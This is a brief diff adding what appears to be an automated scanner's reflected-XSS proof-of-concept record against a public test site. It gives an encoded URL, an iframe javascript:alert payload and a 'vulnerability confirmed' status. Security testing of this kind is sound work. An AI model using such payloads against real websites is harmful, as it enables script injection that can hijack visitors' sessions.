@@ -1,0 +1,6 @@
+XSS Vulnerability PoC
+Type: Reflected_XSS
+URL: http://testphp.vulnweb.com/search.php?searchFor=test?register=%3Ciframe%20src%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C/iframe%3E
+Payload: <iframe src="javascript:alert('XSS')"></iframe>
+Timestamp: 2025-09-06T11:14:28.754396
+Status: VULNERABILITY CONFIRMED
